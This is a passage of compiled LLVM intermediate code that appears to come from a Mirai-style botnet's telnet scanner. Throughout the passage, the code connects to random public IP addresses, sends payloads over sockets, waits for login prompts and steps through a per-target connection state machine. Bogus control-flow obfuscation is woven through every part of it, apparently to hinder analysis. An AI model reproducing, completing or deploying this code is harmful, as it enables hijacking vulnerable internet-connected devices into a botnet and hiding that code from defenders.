  %1048 = icmp slt i32 %1043, 10
  %1049 = or i1 %1047, %1048
  br i1 %1049, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %1041
  %1050 = load i32, i32* %2, align 4
  %1051 = sext i32 %1050 to i64
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1051
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1052, i32 0, i32 0
  %1054 = load i32, i32* %1053, align 16
  %1055 = call i32 @sclose(i32 %1054)
  %1056 = load i32, i32* %2, align 4
  %1057 = sext i32 %1056 to i64
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1057
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1058, i32 0, i32 2
  store i8 0, i8* %1059, align 8
  %1060 = load i32, i32* %2, align 4
  %1061 = sext i32 %1060 to i64
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1061
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1062, i32 0, i32 3
  store i8 1, i8* %1063, align 1
  %1064 = load i32, i32* @x.63
  %1065 = load i32, i32* @y.64
  %1066 = sub i32 %1064, 1
  %1067 = mul i32 %1064, %1066
  %1068 = urem i32 %1067, 2
  %1069 = icmp eq i32 %1068, 0
  %1070 = icmp slt i32 %1065, 10
  %1071 = or i1 %1069, %1070
  br i1 %1071, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br label %1435

; <label>:1072:                                   ; preds = %1016
  %1073 = load i32, i32* @x.63
  %1074 = load i32, i32* @y.64
  %1075 = sub i32 %1073, 1
  %1076 = mul i32 %1073, %1075
  %1077 = urem i32 %1076, 2
  %1078 = icmp eq i32 %1077, 0
  %1079 = icmp slt i32 %1074, 10
  %1080 = or i1 %1078, %1079
  br i1 %1080, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %1072
  %1081 = load i32, i32* %2, align 4
  %1082 = sext i32 %1081 to i64
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1082
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1083, i32 0, i32 0
  %1085 = load i32, i32* %1084, align 16
  %1086 = call i64 @send(i32 %1085, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.28, i32 0, i32 0), i64 2, i32 16384)
  %1087 = icmp slt i64 %1086, 0
  %1088 = load i32, i32* @x.63
  %1089 = load i32, i32* @y.64
  %1090 = sub i32 %1088, 1
  %1091 = mul i32 %1088, %1090
  %1092 = urem i32 %1091, 2
  %1093 = icmp eq i32 %1092, 0
  %1094 = icmp slt i32 %1089, 10
  %1095 = or i1 %1093, %1094
  br i1 %1095, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br i1 %1087, label %1096, label %1111

; <label>:1096:                                   ; preds = %originalBBpart2103
  %1097 = load i32, i32* %2, align 4
  %1098 = sext i32 %1097 to i64
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1098
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1099, i32 0, i32 0
  %1101 = load i32, i32* %1100, align 16
  %1102 = call i32 @sclose(i32 %1101)
  %1103 = load i32, i32* %2, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 2
  store i8 0, i8* %1106, align 8
  %1107 = load i32, i32* %2, align 4
  %1108 = sext i32 %1107 to i64
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1108
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1109, i32 0, i32 3
  store i8 1, i8* %1110, align 1
  br label %1435

; <label>:1111:                                   ; preds = %originalBBpart2103
  %1112 = load i32, i32* %2, align 4
  %1113 = sext i32 %1112 to i64
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1113
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1114, i32 0, i32 2
  store i8 6, i8* %1115, align 8
  br label %1434

; <label>:1116:                                   ; preds = %originalBBpart212
  %1117 = load i32, i32* %2, align 4
  %1118 = sext i32 %1117 to i64
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1118
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1119, i32 0, i32 6
  %1121 = load i32, i32* %1120, align 4
  %1122 = icmp eq i32 %1121, 0
  br i1 %1122, label %1123, label %1129

; <label>:1123:                                   ; preds = %1116
  %1124 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1125 = load i32, i32* %2, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1126
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1127, i32 0, i32 6
  store i32 %1124, i32* %1128, align 4
  br label %1129

; <label>:1129:                                   ; preds = %1123, %1116
  %1130 = load i32, i32* @x.63
  %1131 = load i32, i32* @y.64
  %1132 = sub i32 %1130, 1
  %1133 = mul i32 %1130, %1132
  %1134 = urem i32 %1133, 2
  %1135 = icmp eq i32 %1134, 0
  %1136 = icmp slt i32 %1131, 10
  %1137 = or i1 %1135, %1136
  br i1 %1137, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %1129
  %1138 = load i32, i32* %2, align 4
  %1139 = sext i32 %1138 to i64
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1139
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1140, i32 0, i32 0
  %1142 = load i32, i32* %1141, align 16
  %1143 = load i32, i32* %2, align 4
  %1144 = sext i32 %1143 to i64
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1144
  %1146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1145, i32 0, i32 8
  %1147 = load i8*, i8** %1146, align 8
  %1148 = load i32, i32* %2, align 4
  %1149 = sext i32 %1148 to i64
  %1150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1149
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1150, i32 0, i32 7
  %1152 = load i16, i16* %1151, align 16
  %1153 = zext i16 %1152 to i32
  %1154 = call i32 @readUntil(i32 %1142, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1147, i32 1024, i32 %1153)
  %1155 = icmp ne i32 %1154, 0
  %1156 = load i32, i32* @x.63
  %1157 = load i32, i32* @y.64
  %1158 = sub i32 %1156, 1
  %1159 = mul i32 %1156, %1158
  %1160 = urem i32 %1159, 2
  %1161 = icmp eq i32 %1160, 0
  %1162 = icmp slt i32 %1157, 10
  %1163 = or i1 %1161, %1162
  br i1 %1163, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br i1 %1155, label %1164, label %1287

; <label>:1164:                                   ; preds = %originalBBpart2107
  %1165 = load i32, i32* %2, align 4
  %1166 = sext i32 %1165 to i64
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1166
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1167, i32 0, i32 6
  store i32 0, i32* %1168, align 4
  %1169 = load i32, i32* %2, align 4
  %1170 = sext i32 %1169 to i64
  %1171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1170
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1171, i32 0, i32 7
  store i16 0, i16* %1172, align 16
  %1173 = load i32, i32* %2, align 4
  %1174 = sext i32 %1173 to i64
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1174
  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1175, i32 0, i32 8
  %1177 = load i8*, i8** %1176, align 8
  %1178 = call i8* @strstr(i8* %1177, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)) #10
  %1179 = icmp ne i8* %1178, null
  br i1 %1179, label %1180, label %1200

; <label>:1180:                                   ; preds = %1164
  %1181 = load i32, i32* %2, align 4
  %1182 = sext i32 %1181 to i64
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1182
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1183, i32 0, i32 8
  %1185 = load i8*, i8** %1184, align 8
  call void @llvm.memset.p0i8.i64(i8* %1185, i8 0, i64 1024, i32 1, i1 false)
  %1186 = load i32, i32* %2, align 4
  %1187 = sext i32 %1186 to i64
  %1188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1187
  %1189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1188, i32 0, i32 0
  %1190 = load i32, i32* %1189, align 16
  %1191 = call i32 @sclose(i32 %1190)
  %1192 = load i32, i32* %2, align 4
  %1193 = sext i32 %1192 to i64
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1193
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1194, i32 0, i32 2
  store i8 0, i8* %1195, align 8
  %1196 = load i32, i32* %2, align 4
  %1197 = sext i32 %1196 to i64
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1197
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1198, i32 0, i32 3
  store i8 0, i8* %1199, align 1
  br label %1435

; <label>:1200:                                   ; preds = %1164
  %1201 = load i32, i32* @x.63
  %1202 = load i32, i32* @y.64
  %1203 = sub i32 %1201, 1
  %1204 = mul i32 %1201, %1203
  %1205 = urem i32 %1204, 2
  %1206 = icmp eq i32 %1205, 0
  %1207 = icmp slt i32 %1202, 10
  %1208 = or i1 %1206, %1207
  br i1 %1208, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %1200
  %1209 = load i32, i32* %2, align 4
  %1210 = sext i32 %1209 to i64
  %1211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1210
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1211, i32 0, i32 8
  %1213 = load i8*, i8** %1212, align 8
  %1214 = call i32 @matchPrompt(i8* %1213)
  %1215 = icmp ne i32 %1214, 0
  %1216 = load i32, i32* @x.63
  %1217 = load i32, i32* @y.64
  %1218 = sub i32 %1216, 1
  %1219 = mul i32 %1216, %1218
  %1220 = urem i32 %1219, 2
  %1221 = icmp eq i32 %1220, 0
  %1222 = icmp slt i32 %1217, 10
  %1223 = or i1 %1221, %1222
  br i1 %1223, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br i1 %1215, label %1260, label %1224

; <label>:1224:                                   ; preds = %originalBBpart2111
  %1225 = load i32, i32* @x.63
  %1226 = load i32, i32* @y.64
  %1227 = sub i32 %1225, 1
  %1228 = mul i32 %1225, %1227
  %1229 = urem i32 %1228, 2
  %1230 = icmp eq i32 %1229, 0
  %1231 = icmp slt i32 %1226, 10
  %1232 = or i1 %1230, %1231
  br i1 %1232, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %1224
  %1233 = load i32, i32* %2, align 4
  %1234 = sext i32 %1233 to i64
  %1235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1234
  %1236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1235, i32 0, i32 8
  %1237 = load i8*, i8** %1236, align 8
  call void @llvm.memset.p0i8.i64(i8* %1237, i8 0, i64 1024, i32 1, i1 false)
  %1238 = load i32, i32* %2, align 4
  %1239 = sext i32 %1238 to i64
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1239
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1240, i32 0, i32 0
  %1242 = load i32, i32* %1241, align 16
  %1243 = call i32 @sclose(i32 %1242)
  %1244 = load i32, i32* %2, align 4
  %1245 = sext i32 %1244 to i64
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1245
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1246, i32 0, i32 2
  store i8 0, i8* %1247, align 8
  %1248 = load i32, i32* %2, align 4
  %1249 = sext i32 %1248 to i64
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1249
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1250, i32 0, i32 3
  store i8 1, i8* %1251, align 1
  %1252 = load i32, i32* @x.63
  %1253 = load i32, i32* @y.64
  %1254 = sub i32 %1252, 1
  %1255 = mul i32 %1252, %1254
  %1256 = urem i32 %1255, 2
  %1257 = icmp eq i32 %1256, 0
  %1258 = icmp slt i32 %1253, 10
  %1259 = or i1 %1257, %1258
  br i1 %1259, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %1435

; <label>:1260:                                   ; preds = %originalBBpart2111
  %1261 = load i32, i32* @x.63
  %1262 = load i32, i32* @y.64
  %1263 = sub i32 %1261, 1
  %1264 = mul i32 %1261, %1263
  %1265 = urem i32 %1264, 2
  %1266 = icmp eq i32 %1265, 0
  %1267 = icmp slt i32 %1262, 10
  %1268 = or i1 %1266, %1267
  br i1 %1268, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %1260
  %1269 = load i32, i32* %2, align 4
  %1270 = sext i32 %1269 to i64
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1270
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1271, i32 0, i32 2
  store i8 7, i8* %1272, align 8
  %1273 = load i32, i32* @x.63
  %1274 = load i32, i32* @y.64
  %1275 = sub i32 %1273, 1
  %1276 = mul i32 %1273, %1275
  %1277 = urem i32 %1276, 2
  %1278 = icmp eq i32 %1277, 0
  %1279 = icmp slt i32 %1274, 10
  %1280 = or i1 %1278, %1279
  br i1 %1280, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br label %1281

; <label>:1281:                                   ; preds = %originalBBpart2119
  %1282 = load i32, i32* %2, align 4
  %1283 = sext i32 %1282 to i64
  %1284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1283
  %1285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1284, i32 0, i32 8
  %1286 = load i8*, i8** %1285, align 8
  call void @llvm.memset.p0i8.i64(i8* %1286, i8 0, i64 1024, i32 1, i1 false)
  br label %1435

; <label>:1287:                                   ; preds = %originalBBpart2107
  %1288 = load i32, i32* %2, align 4
  %1289 = sext i32 %1288 to i64
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1289
  %1291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1290, i32 0, i32 8
  %1292 = load i8*, i8** %1291, align 8
  %1293 = call i64 @strlen(i8* %1292) #10
  %1294 = trunc i64 %1293 to i16
  %1295 = load i32, i32* %2, align 4
  %1296 = sext i32 %1295 to i64
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1296
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1297, i32 0, i32 7
  store i16 %1294, i16* %1298, align 16
  br label %1299

; <label>:1299:                                   ; preds = %1287
  %1300 = load i32, i32* %2, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1301
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1302, i32 0, i32 6
  %1304 = load i32, i32* %1303, align 4
  %1305 = add i32 %1304, 30
  %1306 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1307 = icmp ult i32 %1305, %1306
  br i1 %1307, label %1308, label %1323

; <label>:1308:                                   ; preds = %1299
  %1309 = load i32, i32* %2, align 4
  %1310 = sext i32 %1309 to i64
  %1311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1310
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1311, i32 0, i32 0
  %1313 = load i32, i32* %1312, align 16
  %1314 = call i32 @sclose(i32 %1313)
  %1315 = load i32, i32* %2, align 4
  %1316 = sext i32 %1315 to i64
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1316
  %1318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1317, i32 0, i32 2
  store i8 0, i8* %1318, align 8
  %1319 = load i32, i32* %2, align 4
  %1320 = sext i32 %1319 to i64
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1320
  %1322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1321, i32 0, i32 3
  store i8 1, i8* %1322, align 1
  br label %1323

; <label>:1323:                                   ; preds = %1308, %1299
  br label %1434

; <label>:1324:                                   ; preds = %originalBBpart212
  %1325 = load i32, i32* %2, align 4
  %1326 = sext i32 %1325 to i64
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1326
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1327, i32 0, i32 0
  %1329 = load i32, i32* %1328, align 16
  %1330 = call i64 @send(i32 %1329, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i64 4, i32 16384)
  %1331 = icmp slt i64 %1330, 0
  br i1 %1331, label %1332, label %1363

; <label>:1332:                                   ; preds = %1324
  %1333 = load i32, i32* @x.63
  %1334 = load i32, i32* @y.64
  %1335 = sub i32 %1333, 1
  %1336 = mul i32 %1333, %1335
  %1337 = urem i32 %1336, 2
  %1338 = icmp eq i32 %1337, 0
  %1339 = icmp slt i32 %1334, 10
  %1340 = or i1 %1338, %1339
  br i1 %1340, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %1332
  %1341 = load i32, i32* %2, align 4
  %1342 = sext i32 %1341 to i64
  %1343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1342
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1343, i32 0, i32 0
  %1345 = load i32, i32* %1344, align 16
  %1346 = call i32 @sclose(i32 %1345)
  %1347 = load i32, i32* %2, align 4
  %1348 = sext i32 %1347 to i64
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1348
  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1349, i32 0, i32 2
  store i8 0, i8* %1350, align 8
  %1351 = load i32, i32* %2, align 4
  %1352 = sext i32 %1351 to i64
  %1353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1352
  %1354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1353, i32 0, i32 3
  store i8 1, i8* %1354, align 1
  %1355 = load i32, i32* @x.63
  %1356 = load i32, i32* @y.64
  %1357 = sub i32 %1355, 1
  %1358 = mul i32 %1355, %1357
  %1359 = urem i32 %1358, 2
  %1360 = icmp eq i32 %1359, 0
  %1361 = icmp slt i32 %1356, 10
  %1362 = or i1 %1360, %1361
  br i1 %1362, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br label %1435

; <label>:1363:                                   ; preds = %1324
  %1364 = load i32, i32* %2, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1365
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1366, i32 0, i32 2
  store i8 8, i8* %1367, align 8
  br label %1434

; <label>:1368:                                   ; preds = %originalBBpart212
  %1369 = load i32, i32* %2, align 4
  %1370 = sext i32 %1369 to i64
  %1371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1370
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1371, i32 0, i32 6
  %1373 = load i32, i32* %1372, align 4
  %1374 = icmp eq i32 %1373, 0
  br i1 %1374, label %1375, label %1381

; <label>:1375:                                   ; preds = %1368
  %1376 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1377 = load i32, i32* %2, align 4
  %1378 = sext i32 %1377 to i64
  %1379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1378
  %1380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1379, i32 0, i32 6
  store i32 %1376, i32* %1380, align 4
  br label %1381

; <label>:1381:                                   ; preds = %1375, %1368
  %1382 = load i32, i32* %2, align 4
  %1383 = sext i32 %1382 to i64
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1383
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1384, i32 0, i32 0
  %1386 = load i32, i32* %1385, align 16
  %1387 = call i64 @send(i32 %1386, i8* getelementptr inbounds ([214 x i8], [214 x i8]* @.str.32, i32 0, i32 0), i64 284, i32 16384)
  %1388 = icmp slt i64 %1387, 0
  br i1 %1388, label %1389, label %1409

; <label>:1389:                                   ; preds = %1381
  %1390 = load i32, i32* %2, align 4
  %1391 = sext i32 %1390 to i64
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1391
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1392, i32 0, i32 0
  %1394 = load i32, i32* %1393, align 16
  %1395 = call i32 @sclose(i32 %1394)
  %1396 = load i32, i32* %2, align 4
  %1397 = sext i32 %1396 to i64
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1397
  %1399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1398, i32 0, i32 2
  store i8 0, i8* %1399, align 8
  %1400 = load i32, i32* %2, align 4
  %1401 = sext i32 %1400 to i64
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1401
  %1403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1402, i32 0, i32 3
  store i8 1, i8* %1403, align 1
  %1404 = load i32, i32* %2, align 4
  %1405 = sext i32 %1404 to i64
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1405
  %1407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1406, i32 0, i32 8
  %1408 = load i8*, i8** %1407, align 8
  call void @llvm.memset.p0i8.i64(i8* %1408, i8 0, i64 1024, i32 1, i1 false)
  br label %1435

; <label>:1409:                                   ; preds = %1381
  %1410 = load i32, i32* %2, align 4
  %1411 = sext i32 %1410 to i64
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1411
  %1413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1412, i32 0, i32 6
  %1414 = load i32, i32* %1413, align 4
  %1415 = add i32 %1414, 45
  %1416 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1417 = icmp ult i32 %1415, %1416
  br i1 %1417, label %1418, label %1433

; <label>:1418:                                   ; preds = %1409
  %1419 = load i32, i32* %2, align 4
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1420
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1421, i32 0, i32 0
  %1423 = load i32, i32* %1422, align 16
  %1424 = call i32 @sclose(i32 %1423)
  %1425 = load i32, i32* %2, align 4
  %1426 = sext i32 %1425 to i64
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1426
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1427, i32 0, i32 2
  store i8 0, i8* %1428, align 8
  %1429 = load i32, i32* %2, align 4
  %1430 = sext i32 %1429 to i64
  %1431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1430
  %1432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1431, i32 0, i32 3
  store i8 1, i8* %1432, align 1
  br label %1433

; <label>:1433:                                   ; preds = %1418, %1409
  br label %1434

; <label>:1434:                                   ; preds = %1433, %1363, %1323, %1111, %1015, %807, %711, %579, %375, %originalBBpart212
  br label %1435

; <label>:1435:                                   ; preds = %1434, %1389, %originalBBpart2123, %1281, %originalBBpart2115, %1180, %1096, %originalBBpart299, %948, %originalBBpart291, %originalBBpart275, %originalBBpart271, %641, %472, %originalBBpart225, %236
  %1436 = load i32, i32* @x.63
  %1437 = load i32, i32* @y.64
  %1438 = sub i32 %1436, 1
  %1439 = mul i32 %1436, %1438
  %1440 = urem i32 %1439, 2
  %1441 = icmp eq i32 %1440, 0
  %1442 = icmp slt i32 %1437, 10
  %1443 = or i1 %1441, %1442
  br i1 %1443, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %1435
  %1444 = load i32, i32* %2, align 4
  %1445 = add nsw i32 %1444, 1
  store i32 %1445, i32* %2, align 4
  %1446 = load i32, i32* @x.63
  %1447 = load i32, i32* @y.64
  %1448 = sub i32 %1446, 1
  %1449 = mul i32 %1446, %1448
  %1450 = urem i32 %1449, 2
  %1451 = icmp eq i32 %1450, 0
  %1452 = icmp slt i32 %1447, 10
  %1453 = or i1 %1451, %1452
  br i1 %1453, label %originalBBpart2131, label %originalBB125alteredBB

originalBBpart2131:                               ; preds = %originalBB125
  br label %96

; <label>:1454:                                   ; preds = %originalBBpart28
  br label %78
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %20
  %1456 = load i32, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %79
  store i32 0, i32* %2, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %96
  %1457 = load i32, i32* %2, align 4
  %1458 = load i32, i32* %1, align 4
  %1459 = icmp slt i32 %1457, %1458
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %116
  %1460 = load i32, i32* %2, align 4
  %1461 = sext i32 %1460 to i64
  %1462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1461
  %1463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1462, i32 0, i32 2
  %1464 = load i8, i8* %1463, align 8
  %1465 = zext i8 %1464 to i32
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %151
  %1466 = load i32, i32* %2, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1467
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1468, i32 0, i32 8
  %1470 = load i8*, i8** %1469, align 8
  store i8* %1470, i8** %11, align 8
  %1471 = load i32, i32* %2, align 4
  %1472 = sext i32 %1471 to i64
  %1473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1472
  %1474 = bitcast %struct.telstate_t* %1473 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1474, i8 0, i64 32, i32 16, i1 false)
  %1475 = load i8*, i8** %11, align 8
  %1476 = load i32, i32* %2, align 4
  %1477 = sext i32 %1476 to i64
  %1478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1477
  %1479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1478, i32 0, i32 8
  store i8* %1475, i8** %1479, align 8
  %1480 = call i32 @getRandomPublicIP()
  %1481 = load i32, i32* %2, align 4
  %1482 = sext i32 %1481 to i64
  %1483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1482
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1483, i32 0, i32 1
  store i32 %1480, i32* %1484, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %187
  %1485 = load i32, i32* %2, align 4
  %1486 = sext i32 %1485 to i64
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1486
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1487, i32 0, i32 5
  %1489 = load i8, i8* %1488, align 1
  %_ = shl i8 %1489, 1
  %_19 = shl i8 %1489, 1
  %1490 = add i8 %1489, 1
  store i8 %1490, i8* %1488, align 1
  %1491 = load i32, i32* %2, align 4
  %1492 = sext i32 %1491 to i64
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1492
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1493, i32 0, i32 5
  %1495 = load i8, i8* %1494, align 1
  %1496 = zext i8 %1495 to i64
  %1497 = icmp eq i64 %1496, 16
  br label %originalBB18

originalBB23alteredBB:                            ; preds = %originalBB23, %280
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %297
  %1498 = load i32, i32* %2, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1499
